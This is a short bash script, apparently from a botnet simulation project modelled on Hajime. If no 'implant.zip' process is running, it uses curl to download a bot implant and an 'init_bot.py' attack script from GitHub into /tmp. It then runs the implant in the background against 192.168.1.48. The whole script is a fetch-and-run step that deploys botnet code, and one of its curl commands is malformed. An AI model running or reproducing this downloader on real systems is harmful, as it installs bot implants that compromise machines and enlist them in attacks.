#! /bin/bash
ps ax | grep "implant.zip" | grep -v grep;
if test $? -eq 0; 
then 
    echo "Process already running."
else 
    echo "Starting process."
    # get atk file and implant.zip files.
    /usr/bin/curl -LO GET https://github.com/dcsrps/botnet_sim/blob/master/hajime_node/implant/implant.zip?raw=true > /tmp/implant.zip
    /usr/bin/curl -X GET https://raw.githubusercontent.com/dcsrps/botnet_sim/master/hajime_node/others/init_bot.py > /tmp/attack.py
    python3 /tmp/implant.zip 192.168.1.48 &
fi
